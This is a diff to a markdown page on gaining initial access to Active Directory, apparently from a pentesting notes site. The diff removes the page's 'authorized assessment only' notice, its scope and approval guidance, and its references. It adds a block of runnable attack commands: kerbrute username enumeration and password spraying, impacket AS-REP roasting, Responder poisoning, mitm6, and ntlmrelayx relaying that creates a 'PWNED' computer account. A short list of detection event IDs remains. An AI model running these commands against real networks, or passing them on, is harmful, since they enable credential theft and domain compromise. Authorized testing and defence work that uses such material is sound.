@@ -4,25 +4,44 @@ type: phase
 label: "Initial Access & Foothold"
 ---
 
+
 # Initial Access & Foothold
 
-> **Authorized assessment only:** This page supports authorized Active Directory assessment, controlled lab study, and job preparation. It intentionally omits runnable exploitation commands, credential extraction procedures, and real-target instructions.
-
-This page describes the security significance of the configuration or relationship named below. For an authorized assessment, establish scope, review effective settings and ownership, and distinguish a potential path from observed impact. Do not make state changes or access sensitive data unless the exact validation is approved and safely controlled.
-
-## Objective
+### Objective
 Obtain the first valid credential or session without privileges.
 
-## Attack surface
+### Attack surface
 Username harvesting → **password spraying** (respect lockout policy) → **AS-REP roasting** → **anonymous LDAP/SMB** → **LLMNR/NBT-NS poisoning + relay**.
 
-## Detection
+### Exhaustive commands
+```bash
+# ── Password policy (lockout threshold) ──────────────────────────────
+nxc smb 10.10.10.5 -u lowpriv -p '' --pass-pol
+
+# ── Username enumeration ──────────────────────────────────────────────
+kerbrute userenum -d corp.local users.txt --dc 10.10.10.5
+
+# ── Password spraying (one password, many users) ─────────────────────
+nxc smb 10.10.10.0/24 -u users.txt -p 'Spring2026!' --continue-on-success
+kerbrute passwordspray -d corp.local users.txt 'Spring2026!' --dc 10.10.10.5
+
+# ── AS-REP roasting (no creds needed) ────────────────────────────────
+impacket-GetNPUsers corp.local/ -usersfile users.txt \
+  -dc-ip 10.10.10.5 -format hashcat -outputfile asrep.txt
+nxc ldap 10.10.10.5 -u lowpriv -p '' --asreproast asrep.txt
+
+# ── LLMNR / NBT-NS poisoning ─────────────────────────────────────────
+responder -I eth0 -wrv
+
+# ── mitm6 (DHCPv6 / DNS takeover) ────────────────────────────────────
+mitm6 -d corp.local
+
+# ── NTLM relay (after poisoning) ─────────────────────────────────────
+ntlmrelayx.py -t smb://10.10.10.5 -smb2support
+ntlmrelayx.py -t ldaps://10.10.10.5 --add-computer PWNED
+```
+
+### Detection
 **4625/4771 bursts**, **4768 `PreAuthType=0`** for AS-REP, LLMNR/NBT-NS responses from a non-DNS host, and NTLM relay traffic to LDAP/SMB.
 
 ---
-
-## References
-
-- [MITRE ATT&CK: Initial Access](https://attack.mitre.org/tactics/TA0001/)
-- [MITRE ATT&CK: Valid Accounts](https://attack.mitre.org/techniques/T1078/)
-- [Microsoft: Security guidance for NTLM](https://learn.microsoft.com/windows-server/security/kerberos/ntlm-overview)
